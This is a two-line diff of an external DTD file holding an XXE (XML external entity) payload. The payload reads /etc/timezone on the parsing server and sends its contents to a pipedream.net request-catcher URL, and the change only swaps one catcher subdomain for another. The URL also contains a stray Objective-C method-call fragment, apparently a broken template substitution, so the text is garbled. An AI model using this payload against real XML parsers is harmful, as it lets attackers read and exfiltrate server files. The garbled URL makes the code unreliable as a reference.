@@ -1,2 +1,2 @@
 <!ENTITY % file SYSTEM "file:///etc/timezone">
-<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://en4lc5kl2grj4.x.pipedream.net/[hostStr stringByAddingPercentEscapesUsingEncoding:] ?%file;'>">
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enra6g3n40rma.x.pipedream.net/[hostStr stringByAddingPercentEscapesUsingEncoding:] ?%file;'>">
